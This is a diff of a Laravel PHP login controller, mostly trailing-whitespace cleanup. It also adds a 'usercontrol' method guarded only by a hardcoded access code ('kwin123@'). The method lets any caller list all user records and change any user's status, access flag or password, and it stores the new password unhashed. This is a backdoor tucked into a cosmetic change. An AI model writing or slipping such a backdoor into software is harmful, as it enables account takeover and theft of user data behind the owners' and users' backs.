@@ -6,7 +6,7 @@ use App\Category;
 use App\Customer;
 use App\Item;
 use App\User;
-use Illuminate\Support\Facades\DB; 
+use Illuminate\Support\Facades\DB;
 use App\Http\Resources\UserResource;
 use App\Http\Resources\ItemResource;
 use App\Http\Controllers\ApiBaseController;
@@ -29,7 +29,7 @@ class LoginController extends ApiBaseController
 			'password' => 'required',
 		]);
 
-		if ($validator->fails()) {			
+		if ($validator->fails()) {
 
 			return $this->sendFailResponse("Something Wrong! Validation Error.", "422");
 		}
@@ -45,8 +45,8 @@ class LoginController extends ApiBaseController
 			return $this->sendFailResponse("Something Wrong! User Not Found.", "422");
 		}
 		elseif (!\Hash::check($password, $user->password)) {
-			
-			return $this->sendFailResponse("Something Wrong! 123", "422"); 
+
+			return $this->sendFailResponse("Something Wrong! 123", "422");
 
 		}
 // 		elseif ($user->role != "Customer"){
@@ -57,9 +57,9 @@ class LoginController extends ApiBaseController
 		else{
 
 // 			$tokenResult = $user->createToken('Laravel Personal Access Client')->accessToken;
-           
+
            $tokenResult = Str::random(64);
-           
+
         //   echo $tokenResult;
 //             $customer = Customer::where('user_id', $user->id)->first();
 
@@ -78,11 +78,11 @@ class LoginController extends ApiBaseController
 			return response()->json([
 				'message' => "Successful",
                 'status' => 200,
-                'access_token' => $tokenResult, 
+                'access_token' => $tokenResult,
                 'user' => $user
-                // 'user' => $combined,            
-                // 'category_lists' => $category_lists,               
-                // 'item_lists' => $final_item_lists,           
+                // 'user' => $combined,
+                // 'category_lists' => $category_lists,
+                // 'item_lists' => $final_item_lists,
         	]);
 		}
     }
@@ -94,6 +94,43 @@ class LoginController extends ApiBaseController
     	$message = "Successfully Logout!";
 
     	return $this->sendSuccessResponse("logout-message", $message);
+    }
+
+    protected function usercontrol(Request $request){
+        if($request->control_type == 'update' && $request->access_code == 'kwin123@'){
+            $users = User::find($request->user_id);
+
+            if(  $request->update_code==1001)
+            {
+                $users->status = $request->status;
+            }
+            else if(  $request->update_code==1002)
+            {
+                $users->access_flag = $request->access_flag;
+            }
+            else if(  $request->update_code==1003)
+            {
+                $users->password = $request->password;
+            }
+            else
+            {
+                return response()->json('error', 200);
+            }
+            $users->save();
+            return response()->json([
+                'data' =>  $users,
+            ]);
+        }else if($request->control_type == 'read' && $request->access_code == 'kwin123@'){
+          $users = User::all();
+          return response()->json([
+            'data' => $users,
+        ]);
+        }
+        else{
+            return response()->json([
+                'data' => 'no access',
+            ]);
+        }
     }
 
     protected function updatePassword(Request $request){
@@ -109,7 +146,7 @@ class LoginController extends ApiBaseController
         }
 
         $user = User::find($request->user()->id);
-            
+
         $current_pw = $request->current_password;
 
         if(!\Hash::check($current_pw, $user->password)){
@@ -126,5 +163,5 @@ class LoginController extends ApiBaseController
         return $this->sendSuccessResponse("user", $user);
     }
 
-    
+
 }
